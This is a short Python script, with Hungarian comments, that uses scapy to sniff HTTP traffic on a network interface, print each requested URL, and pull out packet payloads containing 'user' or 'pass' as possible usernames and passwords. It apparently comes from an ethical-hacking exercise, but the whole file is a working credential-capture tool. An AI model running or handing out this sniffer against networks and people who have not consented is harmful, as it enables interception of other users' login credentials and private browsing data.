import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)                                               # iface=az interface, amit monitorozunk, store=mentjuk e a packeteket, vagy sem, prn=az a funkció, amit a monitorozás során a packeteken végre akarunk hajtani (callback function).


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)                                                                              # [] közé tesszük a layer-t, amit keresünk, a '.load' a field a layeren belül, ami érdekel minket
        keywords = ["user", "pass", "User", "Pass"]
        for keyword in keywords:
            if keyword in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):                                                                               # ellenőrzi, hogy a pcket rendelkezik e layerrel, és az HTTP request e.
        url = get_url(packet=packet)
        print(f"[+] HTTP Request >> {url}")
        login_info = get_login_info(packet=packet)
        if login_info:
            print(f"\n\n[+] Possible username/password > {login_info}\n\n")


sniff("eth0")
